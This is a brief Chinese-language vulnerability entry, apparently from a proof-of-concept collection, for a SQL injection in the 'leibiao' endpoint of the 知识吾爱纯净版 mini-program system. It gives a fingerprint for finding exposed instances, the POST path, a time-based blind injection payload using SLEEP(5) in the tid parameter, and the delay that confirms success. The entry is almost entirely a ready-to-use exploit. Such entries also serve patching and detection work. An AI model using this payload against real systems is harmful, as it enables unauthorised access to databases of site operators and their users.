# 知识吾爱纯净版小程序系统leibiao存在SQL注入漏洞

知识吾爱纯净版小程序系统 ｜ SQL注入 ｜ —
- **指纹**：`"域名/skdjfdf"`
- **请求**：`POST /app/zm/leibiao HTTP/1.1`

**Payload**
```
tid=(CASE WHEN (3711=3711) THEN SLEEP(5) ELSE 3711 END)
```
- **响应特征**：200 响应时间>=5S